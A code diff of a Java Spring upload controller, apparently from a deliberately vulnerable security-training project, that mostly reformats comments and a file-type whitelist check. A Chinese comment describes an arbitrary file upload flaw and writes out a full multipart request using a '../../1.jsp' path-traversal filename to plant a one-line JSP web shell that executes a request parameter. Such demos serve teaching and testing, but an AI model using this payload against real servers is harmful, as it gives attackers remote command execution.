@@ -20,17 +20,17 @@ public class UploadController {
     /**
      * 存在任意文件上传漏洞，攻击者发送如下数据包上传文件，通过修改filename参数，即可上传JSP木马到任意目录
      *
-        POST /upload/1 HTTP/1.1
-        Host: 127.0.0.1:8080
-        Content-Type: multipart/form-data; boundary=------------------------qazwsx
-        Content-Length: 224
-
-        --------------------------qazwsx
-        Content-Disposition: form-data; name="file"; filename="../../1.jsp"
-        Content-Type: text/plain
-
-        <%Runtime.getRuntime().exec(request.getParameter("i"));%>
-        --------------------------qazwsx--
+     * POST /upload/1 HTTP/1.1
+     * Host: 127.0.0.1:8080
+     * Content-Type: multipart/form-data; boundary=------------------------qazwsx
+     * Content-Length: 224
+     * 
+     * --------------------------qazwsx
+     * Content-Disposition: form-data; name="file"; filename="../../1.jsp"
+     * Content-Type: text/plain
+     * 
+     * <%Runtime.getRuntime().exec(request.getParameter("i"));%>
+     * --------------------------qazwsx--
      */
     @ApiOperation("存在任意文件上传漏洞")
     @PostMapping("1")
@@ -67,7 +67,7 @@ public class UploadController {
     @PostMapping("safe2")
     public String safeUpload2(MultipartFile file) throws IOException {
         String fileName = file.getOriginalFilename();
-        if (checkParameter(fileName)){
+        if (checkParameter(fileName)) {
             String suffix = fileName.substring(fileName.lastIndexOf("."));
             File tempFile = File.createTempFile("tmp", suffix);
             tempFile.deleteOnExit();
@@ -79,9 +79,10 @@ public class UploadController {
     }
 
     public static boolean checkParameter(String fileName) {
-        String[] fileTypeWhiteList = {".xls", ".xlsx", ".csv"}; // 文件类型白名单
+        String[] fileTypeWhiteList = { ".xls", ".xlsx", ".csv" }; // 文件类型白名单
         for (String fileType : fileTypeWhiteList) {
-            if (fileName.endsWith(fileType) && !fileName.contains("..") && !fileName.contains("/") && !fileName.contains("\\")) {
+            if (fileName.endsWith(fileType) && !fileName.contains("..") && !fileName.contains("/")
+                    && !fileName.contains("\\")) {
                 return true;
             }
         }
